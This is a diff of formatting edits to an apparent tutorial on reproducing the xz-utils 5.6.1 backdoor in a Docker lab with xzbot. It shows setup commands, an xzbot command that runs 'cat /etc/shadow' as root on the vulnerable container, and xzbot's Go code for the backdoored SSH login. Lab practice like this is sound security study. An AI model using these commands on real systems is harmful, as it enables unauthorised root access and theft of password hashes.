@@ -68,6 +68,8 @@ Remember that you may want to `sudo reboot` for docker to set up properly.
 To practice this exploit, we're going to use Davide Guerri's ["Small collection of famous exploits"](https://github.com/dguerri/exploits-collection/tree/main), which describes itself as a "Docker test beds for famous, high-severity, exploits". In this repo, Davide has done a great job of dockerizing [Anthony Weems's xzbot](https://github.com/amlweems/xzbot) for testing and practice. It looks like both Anthony and Davide work for Google, which isn't relevant, but it makes me feel better about not being able to figure this out on my own.
 
 In your hacking environment, run [the setup commands](https://github.com/dguerri/exploits-collection/tree/main?tab=readme-ov-file#how-to-use):
+
+>
 > ```bash
 > git clone https://github.com/dguerri/exploits-collection.git
 > cd exploits-collection
@@ -80,7 +82,7 @@ cd xz-5.6.1-backdoor
 git submodule update --init --recursive
 ```
 
-### Running the containers 
+### Running the containers
 
 Now, you should be in the [`xz-5.6.1-backdoor`](https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor) folder.
 
@@ -91,6 +93,7 @@ docker compose up --build -d
 ```
 
 This will create two networked containers:
+
     1. `xzbackdoor-vulnerable` - This is what we will attack
     2. `xzbackdoor-poc` - This is where we will attack from
 
@@ -105,6 +108,7 @@ Davide's has listed instructions on [how to execute the backdoor](https://github
 ```bash
 # start bash in the docker instance
 docker exec -it xzbackdoor-poc bash
+# activate python environment (optional, but nice if you want to use patch.py)
 . /opt/venv/bin/activate
 ```
 
@@ -146,7 +150,7 @@ Usage of /exploit/xzbot/xzbot:
 /exploit/xzbot/xzbot -addr xzbackdoor-vulnerable:22 -seed "$seed" -cmd "cat /etc/shadow > /tmp/.xz"
 ```
 
-Note the output of this should end with "ssh: handshake failed: EOF". This is normal.
+Note the output of this should end with "`ssh: handshake failed: EOF`". This is normal.
 
 <aside>
 
@@ -229,26 +233,26 @@ But, why are we using xzbot? Is it doing anything magical to help us out here?
 
 Nope! It's just establishing the SSH connection with the appropriate key!
 
-```go
-	// ...
-	signingKey := ed448.NewKeyFromSeed(seed[:])     // creates a key from same seed as in vulnerable system
-	xz := &xzSigner{                                // xzSigner takes a signing key and generates the appropriate public key
-		signingKey:    signingKey,                  
-		encryptionKey: signingKey[ed448.SeedSize:],
-	}
-	// this creates an SSH client as the root user
-	config := &ssh.ClientConfig{
-		User: "root",
-		Auth: []ssh.AuthMethod{                     // Establishes the authentication method using the public
-			ssh.PublicKeys(xz),                     //   key generated from the initial signing key and seed.
-		},
-		HostKeyCallback: xz.HostKeyCallback,        // takes the SSH public key and computes a hash
-	}
-	client, err := ssh.Dial("tcp", *addr, config)   // establish an SSH connection
-	// ...
-```
-
-&mdash; [xzbot/main.go](https://github.com/amlweems/xzbot/blob/8ae5b706fb2c6040a91b233ea6ce39f9f09441d5/main.go#L193-L205) (comments are mine)
+> ```go
+> 	// ...
+> 	signingKey := ed448.NewKeyFromSeed(seed[:])     // creates a key from same seed as in vulnerable system
+> 	xz := &xzSigner{                                // xzSigner takes a signing key and generates the appropriate public key
+> 		signingKey:    signingKey,
+> 		encryptionKey: signingKey[ed448.SeedSize:],
+> 	}
+> 	// this creates an SSH client as the root user
+> 	config := &ssh.ClientConfig{
+> 		User: "root",
+> 		Auth: []ssh.AuthMethod{                     // Establishes the authentication method using the public
+> 			ssh.PublicKeys(xz),                     //   key generated from the initial signing key and seed.
+> 		},
+> 		HostKeyCallback: xz.HostKeyCallback,        // takes the SSH public key and computes a hash
+> 	}
+> 	client, err := ssh.Dial("tcp", *addr, config)   // establish an SSH connection
+> 	// ...
+> ```
+> 
+> &mdash; [xzbot/main.go](https://github.com/amlweems/xzbot/blob/8ae5b706fb2c6040a91b233ea6ce39f9f09441d5/main.go#L193-L205) (comments are mine)
 
 ## How to exploit without using xzbot?
 
@@ -265,8 +269,8 @@ Here's a compilation of the resources I found to be helpful, with the date they 
 
 <!-- make list of links easier to read -->
 <style>
-section#further-reading li, 
-section#further-reading a, 
+section#further-reading li,
+section#further-reading a,
 section#further-reading p {
     line-height: 1.1em;
     text-decoration: none;
